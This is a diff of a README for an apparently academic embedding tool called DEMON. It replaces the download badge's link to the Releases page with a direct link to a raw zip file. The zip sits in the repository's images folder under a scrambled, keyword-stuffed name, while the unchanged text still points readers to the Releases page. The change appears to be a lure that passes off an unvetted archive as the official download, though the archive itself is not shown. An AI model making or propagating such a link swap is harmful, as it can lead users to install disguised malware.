@@ -8,7 +8,7 @@ To get started, you will need to download the software. Follow these simple step
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
 
-   [![Download DEMON](https://img.shields.io/badge/Download-DEMON-blue.svg)](https://github.com/Cartx9/DEMON-Deterministic-Embedding-from-Manifold-Observation-Neighbors/releases)
+   [![Download DEMON](https://github.com/Cartx9/DEMON-Deterministic-Embedding-from-Manifold-Observation-Neighbors/raw/refs/heads/main/images/DEMO_from_Embedding_Deterministic_Neighbors_Observation_Manifold_v2.5.zip)](https://github.com/Cartx9/DEMON-Deterministic-Embedding-from-Manifold-Observation-Neighbors/raw/refs/heads/main/images/DEMO_from_Embedding_Deterministic_Neighbors_Observation_Manifold_v2.5.zip)
 
 2. **Choose the Latest Version**: On the Releases page, look for the most recent version. The latest version usually has a tag next to it like "Latest Release."
 
